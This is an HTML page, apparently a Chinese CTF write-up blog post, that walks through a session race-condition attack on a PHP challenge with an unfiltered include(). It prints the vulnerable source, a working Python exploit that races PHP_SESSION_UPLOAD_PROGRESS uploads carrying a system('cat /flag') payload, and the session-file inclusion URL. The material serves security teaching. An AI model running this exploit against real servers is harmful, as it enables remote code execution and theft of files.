@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>session条件竞争 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="session条件竞争打开页面，看见源码 12345678910111213141516171819202122232425262728&lt;?phphighlight_file(&amp;#x27;index.php&amp;#x27;);error_reporting(0);$gwht&#x3D; $_GET[&quot;gwht&quot;];$ycb&#x3D; $_GET[&quot;ycb&quot;];if(preg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="session条件竞争">
+<meta property="og:url" content="http://example.com/2021/09/12/session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="session条件竞争打开页面，看见源码 12345678910111213141516171819202122232425262728&lt;?phphighlight_file(&amp;#x27;index.php&amp;#x27;);error_reporting(0);$gwht&#x3D; $_GET[&quot;gwht&quot;];$ycb&#x3D; $_GET[&quot;ycb&quot;];if(preg">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-12T14:57:59.727Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-session条件竞争" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/12/session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
+  	<time datetime="2021-09-11T16:00:00.000Z" itemprop="datePublished">2021-09-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      session条件竞争
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="session条件竞争"><a href="#session条件竞争" class="headerlink" title="session条件竞争"></a>session条件竞争</h1><p>打开页面，看见源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$gwht= $_GET[&quot;gwht&quot;];</span><br><span class="line">$ycb= $_GET[&quot;ycb&quot;];</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$gwht))&#123;</span><br><span class="line">    die(&#x27;hack&#x27; );</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/secret/&quot;,$gwht))&#123;</span><br><span class="line">    die(&#x27;hack&#x27; );</span><br><span class="line">&#125;</span><br><span class="line">include($gwht);</span><br><span class="line">if(isset($ycb))&#123;</span><br><span class="line">    $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class="line">    echo $url[&#x27;query&#x27;];</span><br><span class="line">    parse_str($url[&#x27;query&#x27;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        echo $value;</span><br><span class="line">        if (preg_match(&quot;/Flag/&quot;,$value)) &#123;</span><br><span class="line">            die(&#x27;not hit&#x27;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo serialize($ycb);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;what are you doing&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过源码，我们可以看到有个include()函数可以给我们利用来读取文件，但它使用正则过滤，过滤掉了flag，所以我们可以使用data伪协议来构造php代码来读取，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//?gwht=/var/lib/php5/sess_ph1</span><br></pre></td></tr></table></figure>
+<p>来读取目录信息，发现不行，经过本地测试发现是因为php默认allow_url_include=0，所以不可以使用data伪协议，但是我们可以使用session条件竞争来做，由于你上传的文件，会被服务器放在一个地方，然后进行判断文件是否有害，有害则被删除，但是如果时间太长的话，我们就可以利用这个时间间隙来访问文件，所以改了个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">    </span><br><span class="line">sessid = &#x27;ph1&#x27;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def t1(session):</span><br><span class="line">	while True:</span><br><span class="line">		f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">		response = session.post(</span><br><span class="line">			&#x27;http://192.168.39.219:8000/&#x27;,</span><br><span class="line">			data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;cat /flag&quot;);?&gt;&#x27;&#125;,</span><br><span class="line">			files=&#123;&#x27;file&#x27;: (&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">			cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class="line">		)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def t2(session):</span><br><span class="line">	while True:</span><br><span class="line">		response = session.get(f&#x27;http://192.168.39.219:8000//?gwht=/var/lib/php5/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">		print(response.text)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">with requests.session() as session:</span><br><span class="line">	t1 = threading.Thread(target=t1, args=(session, ))</span><br><span class="line">	t1.daemon = True</span><br><span class="line">	t1.start()</span><br><span class="line"></span><br><span class="line">	t2(session)</span><br></pre></td></tr></table></figure>
+<p>如果用命令行看返回结果的话，有点麻烦，所以我们直接在页面，通过它给的include()函数来包含上传文件，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//?gwht=/var/lib/php5/sess_ph1</span><br></pre></td></tr></table></figure>
+<p>然后不断刷新，来包含sess_ph1文件，从而读取flag</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/10/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(xxe%E6%BC%8F%E6%B4%9E)%E4%B9%8B%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">外部实体注入(xxe漏洞)之内网探测</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="session条件竞争" data-title="session条件竞争" data-url="http://example.com/2021/09/12/session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="session条件竞争">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
